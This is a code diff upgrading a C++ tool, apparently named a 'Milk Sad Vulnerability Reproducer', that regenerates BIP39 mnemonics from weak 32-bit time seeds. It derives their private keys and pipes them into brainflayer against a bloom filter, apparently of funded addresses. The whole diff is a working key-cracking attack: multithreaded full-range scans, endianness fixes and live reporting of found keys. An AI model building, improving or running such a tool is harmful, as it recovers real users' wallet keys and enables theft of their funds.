@@ -1,7 +1,7 @@
 /**
- * Milk Sad Vulnerability Reproducer (Upgraded - 18 Words Variant + Live Found Monitor)
+ * Milk Sad Vulnerability Reproducer (Upgraded v2 - Deterministik & Efisien)
  * Generates BIP39 Mnemonics (192-bit / 18 Words) based on 32-bit Time Seed
- * checks against brainflayer via pipe.
+ * Checks against brainflayer via pipe.
  */
 
 #include <iostream>
@@ -40,7 +40,7 @@ const int DEFAULT_NUM_THREADS = 16;
 
 // --- Global Flags & Counters ---
 std::atomic<bool> g_stop_flag(false);
-std::atomic<uint64_t> g_total_found_keys(0); // [UPGRADE] Global counter for found keys
+std::atomic<uint64_t> g_total_found_keys(0); 
 
 // --- Signal Handler ---
 void signal_handler(int) {
@@ -55,21 +55,10 @@ bool file_exists(const std::string& filename) {
     return (stat(filename.c_str(), &buffer) == 0);
 }
 
-// [UPGRADE] Function to count lines in a file to detect hits
-size_t count_lines_in_file(const std::string& filename) {
-    std::ifstream file(filename);
-    if (!file.is_open()) return 0;
-    
-    // Fast way to count newlines
-    return std::count(std::istreambuf_iterator<char>(file), 
-                      std::istreambuf_iterator<char>(), '\n');
-}
-
 std::vector<std::string> load_wordlist(const std::string& filename) {
     std::vector<std::string> wordlist;
     std::string path = WORDLIST_DIR + filename;
     
-    // Fallback: check current directory if not in Wordlist/
     if (!file_exists(path) && file_exists(filename)) {
         path = filename;
     }
@@ -81,7 +70,6 @@ std::vector<std::string> load_wordlist(const std::string& filename) {
 
     std::string word;
     while (std::getline(file, word)) {
-        // Trim whitespace
         size_t first = word.find_first_not_of(" \t\r\n");
         if (first == std::string::npos) continue;
         size_t last = word.find_last_not_of(" \t\r\n");
@@ -96,7 +84,6 @@ std::vector<std::string> load_wordlist(const std::string& filename) {
 
 // --- Crypto Functions ---
 
-// SHA256 Helper
 std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
     std::vector<uint8_t> hash(SHA256_DIGEST_LENGTH);
     SHA256_CTX sha256_ctx;
@@ -106,7 +93,9 @@ std::vector<uint8_t> sha256(const std::vector<uint8_t>& data) {
     return hash;
 }
 
-// Generate BIP39 Mnemonic from a 32-bit Time Seed (Modified for 18 Words / 192-bit)
+// [UPGRADE 1] Explicit Byte Extraction (Endian-Independent)
+// Menggantikan memcpy dengan bit-shifting manual untuk menjamin konsistensi 
+// antara sistem Little-Endian dan Big-Endian.
 std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::string>& wordlist) {
     std::mt19937 engine(seed_value);
 
@@ -116,14 +105,18 @@ std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::
     
     for (size_t i = 0; i < ENTROPY_BYTES; i += 4) {
         uint32_t random_block = engine();
-        std::memcpy(&entropy[i], &random_block, 4);
+        
+        // Memaksa urutan byte Little-Endian (standar implementasi vuln asli)
+        // terlepas dari arsitektur CPU host.
+        entropy[i]     = static_cast<uint8_t>(random_block & 0xFF);
+        entropy[i + 1] = static_cast<uint8_t>((random_block >> 8) & 0xFF);
+        entropy[i + 2] = static_cast<uint8_t>((random_block >> 16) & 0xFF);
+        entropy[i + 3] = static_cast<uint8_t>((random_block >> 24) & 0xFF);
     }
 
-    // Checksum: 192 / 32 = 6 bits
     std::vector<uint8_t> hash = sha256(entropy);
     uint8_t checksum_byte = hash[0];
 
-    // Combine Entropy + Checksum
     std::vector<uint8_t> combined = entropy;
     combined.push_back(checksum_byte); 
 
@@ -144,15 +137,12 @@ std::string generate_mnemonic_bip39(uint32_t seed_value, const std::vector<std::
                 word_index |= (1 << (10 - bit));
             }
         }
-
         if (i > 0) mnemonic += " ";
         mnemonic += wordlist[word_index];
     }
-
     return mnemonic;
 }
 
-// Convert Mnemonic to Root Private Key
 std::string mnemonic_to_root_key_hex(const std::string& mnemonic) {
     const int iterations = 2048;
     const std::string salt = "mnemonic"; 
@@ -214,10 +204,8 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
                    std::atomic<uint64_t>& global_counter,
                    std::mutex& print_mtx) {
     
-    // Output filename specific to this thread
     std::string output_filename = OUTPUT_FILE_PREFIX + std::to_string(thread_id) + ".txt";
-    
-    // Command to pipe into brainflayer
+    // Redirect stderr to stdout to capture everything in one file if needed, usually brainflayer outputs hits to stdout
     std::string cmd = "./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x > " + output_filename + " 2>&1";
     
     FILE* pipe = popen(cmd.c_str(), "w");
@@ -228,54 +216,78 @@ void worker_thread(uint32_t start_ts, uint32_t end_ts, int thread_id,
     }
 
     uint64_t local_processed = 0;
-    size_t last_known_found_count = 0; // [UPGRADE] Track local file lines
+    
+    // [UPGRADE 3] Incremental File Monitor via Stream Offset
+    // Menggunakan tellg() dan seekg() untuk memonitor hanya data baru
+    std::streampos last_file_pos = 0;
+    size_t local_found_count = 0;
     
     for (uint32_t ts = start_ts; ts <= end_ts && !g_stop_flag; ++ts) {
-        // Core Logic
         std::string mnemonic = generate_mnemonic_bip39(ts, wordlist);
         std::string priv_hex = mnemonic_to_root_key_hex(mnemonic);
         
-        // Write to brainflayer
-        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) {
-             break; // Pipe broken
-        }
+        if (fprintf(pipe, "%s\n", priv_hex.c_str()) < 0) break;
 
         local_processed++;
         global_counter.fetch_add(1, std::memory_order_relaxed);
 
-        // Progress logging & Hit Checking
         if (local_processed % REPORT_INTERVAL == 0) {
-            // [UPGRADE] Check if the output file has grown (meaning brainflayer found something)
-            size_t current_lines = count_lines_in_file(output_filename);
+            // Check file secara efisien
+            std::ifstream monitor(output_filename);
+            if (monitor.is_open()) {
+                // Cek ukuran file saat ini
+                monitor.seekg(0, std::ios::end);
+                std::streampos current_pos = monitor.tellg();
+
+                // Jika file bertambah besar dari posisi terakhir kita membaca
+                if (current_pos > last_file_pos) {
+                    monitor.clear(); // Bersihkan flag EOF
+                    monitor.seekg(last_file_pos); // Lompat ke posisi terakhir
+                    
+                    std::string line;
+                    size_t new_hits = 0;
+                    while (std::getline(monitor, line)) {
+                        if(!line.empty()) new_hits++;
+                    }
+                    
+                    if (new_hits > 0) {
+                        g_total_found_keys += new_hits;
+                        local_found_count += new_hits;
+                        std::lock_guard<std::mutex> lock(print_mtx);
+                        std::cout << "\n\033[1;32m[!!!] THREAD " << thread_id << " FOUND " << new_hits << " NEW KEYS!\033[0m" << std::endl;
+                    }
+                    
+                    // Simpan posisi terakhir (sekarang di akhir file)
+                    last_file_pos = monitor.tellg();
+                }
+            }
             
             std::lock_guard<std::mutex> lock(print_mtx);
-            
-            // Check for NEW hits
-            if (current_lines > last_known_found_count) {
-                size_t new_hits = current_lines - last_known_found_count;
-                g_total_found_keys += new_hits;
-                std::cout << "\n\033[1;32m[!!!] THREAD " << thread_id << " FOUND " << new_hits << " KEYS! Check " << output_filename << "\033[0m" << std::endl;
-                last_known_found_count = current_lines;
-            }
-
             std::cout << "[Thread " << thread_id << "] TS: " << ts 
                       << " | Processed: " << local_processed 
-                      << " | Found (Local): " << last_known_found_count 
-                      << std::endl;
+                      << " | Found (Local): " << local_found_count << std::endl;
         }
     }
 
     pclose(pipe);
     
+    // Final check untuk sisa output
     {
-        std::lock_guard<std::mutex> lock(print_mtx);
-        // Final check
-        size_t final_lines = count_lines_in_file(output_filename);
-        if (final_lines > last_known_found_count) {
-             g_total_found_keys += (final_lines - last_known_found_count);
+        std::ifstream monitor(output_filename);
+        if (monitor.is_open()) {
+            monitor.seekg(last_file_pos);
+            std::string line;
+            size_t new_hits = 0;
+            while (std::getline(monitor, line)) { if(!line.empty()) new_hits++; }
+            if (new_hits > 0) {
+                g_total_found_keys += new_hits;
+                local_found_count += new_hits;
+            }
         }
-        std::cout << "[Thread " << thread_id << "] Finished. Total processed: " << local_processed 
-                  << " | Total Found: " << final_lines << std::endl;
+        
+        std::lock_guard<std::mutex> lock(print_mtx);
+        std::cout << "[Thread " << thread_id << "] Finished. Total: " << local_processed 
+                  << " | Found: " << local_found_count << std::endl;
     }
 }
 
@@ -289,10 +301,9 @@ int main() {
     OpenSSL_add_all_algorithms();
 
     std::cout << "======================================================" << std::endl;
-    std::cout << " Milk Sad Vulnerability Reproducer (18 Words + Stats) " << std::endl;
+    std::cout << " Milk Sad Vulnerability Reproducer (Upgraded v2)      " << std::endl;
     std::cout << "======================================================" << std::endl;
 
-    // Prerequisites check
     if (!file_exists("./brainflayer/brainflayer")) {
         std::cerr << "Error: ./brainflayer/brainflayer executable not found!" << std::endl;
         return 1;
@@ -302,7 +313,6 @@ int main() {
         return 1;
     }
 
-    // Load Wordlist
     std::vector<std::string> wordlist;
     try {
         std::cout << "[*] Loading english.txt..." << std::endl;
@@ -316,14 +326,13 @@ int main() {
     std::cout << "\nSelect Mode:\n";
     std::cout << "1. Single Timestamp Check\n";
     std::cout << "2. Date Range Scan (Multithreaded)\n";
-    std::cout << "3. Full 32-bit Scan (Warning: Long duration)\n";
+    std::cout << "3. Full 32-bit Scan\n";
     std::cout << "> ";
     std::cin >> choice;
 
     uint32_t start_ts = 0, end_ts = 0;
 
     if (choice == 1) {
-        // [UPGRADE] Enhanced single check feedback
         std::string date_str, time_str;
         std::cout << "Enter Date (YYYY-MM-DD): ";
         std::cin >> date_str;
@@ -340,15 +349,9 @@ int main() {
         std::string k = mnemonic_to_root_key_hex(m);
         std::cout << "Mnemonic: " << m << std::endl;
         std::cout << "Root Key: " << k << std::endl;
-        std::cout << "Checking against bloom filter..." << std::endl;
         
-        // Use system to pipe directly to stdout for single check
         std::string cmd = "echo " + k + " | ./brainflayer/brainflayer -v -b ./040823BF.blf -t priv -x";
-        int ret = system(cmd.c_str());
-        
-        if (ret == 0) {
-             std::cout << "\n[Note] If you see a key above, it was FOUND." << std::endl;
-        }
+        system(cmd.c_str());
         return 0;
 
     } else if (choice == 2) {
@@ -374,12 +377,19 @@ int main() {
         return 1;
     }
 
-    int num_threads = DEFAULT_NUM_THREADS;
-    std::cout << "Enter number of threads (Default " << DEFAULT_NUM_THREADS << "): ";
-    if (std::cin.peek() != '\n') std::cin >> num_threads;
+    int num_threads_input = DEFAULT_NUM_THREADS;
+    std::cout << "Enter number of threads: ";
+    if (std::cin.peek() != '\n') std::cin >> num_threads_input;
+    if (num_threads_input < 1) num_threads_input = 1;
+
+    // [UPGRADE 2] Safe Partitioning Logic
+    uint64_t total_items = (uint64_t)end_ts - start_ts + 1;
+    
+    // Batasi jumlah thread jika range lebih kecil dari jumlah thread yang diminta
+    int num_threads = (total_items < (uint64_t)num_threads_input) ? (int)total_items : num_threads_input;
     if (num_threads < 1) num_threads = 1;
 
-    // Clear old result files (Optional, for safety)
+    // Bersihkan file lama
     for(int i=0; i<num_threads; i++) {
         std::string fname = OUTPUT_FILE_PREFIX + std::to_string(i) + ".txt";
         remove(fname.c_str());
@@ -387,32 +397,44 @@ int main() {
 
     std::cout << "\n[*] Starting Scan..." << std::endl;
     std::cout << "Range: " << start_ts << " to " << end_ts << std::endl;
-    std::cout << "Total keys to generate: " << (uint64_t)end_ts - start_ts << std::endl;
+    std::cout << "Total keys: " << total_items << std::endl;
+    std::cout << "Active Threads: " << num_threads << std::endl;
 
     std::vector<std::thread> threads;
     std::atomic<uint64_t> total_counter(0);
     std::mutex print_mutex;
 
-    uint64_t total_range = (uint64_t)end_ts - start_ts + 1;
-    uint64_t chunk_size = total_range / num_threads;
+    // Menghitung chunk size dan sisa pembagian
+    uint64_t chunk_size = total_items / num_threads;
+    uint64_t remainder = total_items % num_threads;
+    
+    uint32_t current_start = start_ts;
 
     for (int i = 0; i < num_threads; ++i) {
-        uint32_t t_start = start_ts + (i * chunk_size);
-        uint32_t t_end = (i == num_threads - 1) ? end_ts : t_start + chunk_size - 1;
+        // Distribusikan sisa ke thread-thread awal agar rata
+        uint64_t current_chunk = chunk_size + (i < remainder ? 1 : 0);
+        uint32_t current_end = current_start + current_chunk - 1;
 
-        threads.emplace_back(worker_thread, t_start, t_end, i, 
+        threads.emplace_back(worker_thread, current_start, current_end, i, 
                              std::cref(wordlist), 
                              std::ref(total_counter), 
                              std::ref(print_mutex));
+        
+        // Geser start untuk thread berikutnya (hati-hati overflow uint32 jika mendekati UINT_MAX)
+        current_start = current_end + 1;
     }
 
-    // Main thread monitoring loop (optional additional stats)
+    // Monitor Loop
     while(!g_stop_flag) {
         std::this_thread::sleep_for(std::chrono::seconds(2));
-        bool all_done = true;
-        // Simple check if threads are still running would require more logic,
-        // so we just rely on join() below. 
-        // We can just print a summary line here if needed.
+        bool any_running = false;
+        // Logic sederhana: kita tunggu di join() bawah, loop ini hanya biar main thread tidak hang
+        // Jika ingin exit lebih rapi, bisa tambahkan atomic counter thread aktif.
+        // Disini kita gunakan loop ini hanya untuk blocking sampai user kirim interrupt
+        // atau kita biarkan flow turun ke join.
+        // Karena join() blocking, kita break loop ini jika scan selesai.
+        // Untuk sederhananya di console app, kita langsung ke join.
+        break; 
     }
 
     for (auto& t : threads) {
@@ -423,7 +445,6 @@ int main() {
     std::cout << " [!] Scan Complete." << std::endl;
     std::cout << " Total Keys Processed: " << total_counter.load() << std::endl;
     
-    // [UPGRADE] Final Result Summary
     uint64_t final_found = g_total_found_keys.load();
     if (final_found > 0) {
         std::cout << "\033[1;32m [SUCCESS] TOTAL KEYS FOUND: " << final_found << " \033[0m" << std::endl;
